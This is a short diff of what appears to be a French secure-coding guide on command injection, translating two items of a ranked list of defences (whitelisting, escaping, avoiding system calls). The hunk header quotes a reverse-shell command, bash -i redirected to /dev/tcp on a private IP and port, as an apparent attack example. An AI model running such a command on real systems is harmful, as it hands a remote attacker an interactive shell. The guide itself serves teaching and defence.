@@ -118,8 +118,8 @@ bash -i >& /dev/tcp/192.168.174.1/4443 0>&1
 1. EVITER les appels systeme (utiliser les fonctions natives du langage)
 2. Whitelist + framework
 3. Encoder, echapper (fonctions du langage)
-4. Blacklist (jamais complete)
-5. "Hope no-one will inject here" (MAUVAIS)
+4. Liste noire (jamais complete)
+5. "Esperons que personne n'injectera ici" (MAUVAIS)
 ```
 
 ### Exemple : proteger la fonction ping
